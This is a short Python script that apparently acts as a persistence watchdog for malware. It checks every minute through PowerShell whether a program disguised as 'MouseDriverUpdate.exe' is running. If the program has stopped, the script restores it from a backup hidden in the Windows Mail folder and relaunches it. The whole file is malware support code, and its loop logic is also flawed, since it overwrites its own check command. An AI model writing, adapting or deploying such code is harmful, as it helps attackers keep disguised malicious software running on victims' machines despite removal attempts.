import subprocess
import os 
import time 

def power_run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=False, close_fds=True)
    return completed

malware= "C:\Program Files (x86)\MouseDriverUpdate.exe"
command = "Get-Process -Name MouseDriverUpdate > Processes.txt"
copy = "C:\Program Files\Windows Mail\MouseDriverUpdate.exe"
while True:
    power_run(command)

    malwareprocesses = "Processes.txt"
    malwareprocesses = os.getcwd() + "\\" + malwareprocesses
    malwareprocesses = os.path.getsize(malwareprocesses)
    if malwareprocesses == 0:
        command = "copy \"" + copy + "\" \"" + malware + "\""
        os.system(command)
        subprocess.Popen([malware], close_fds=True)
    time.sleep(60)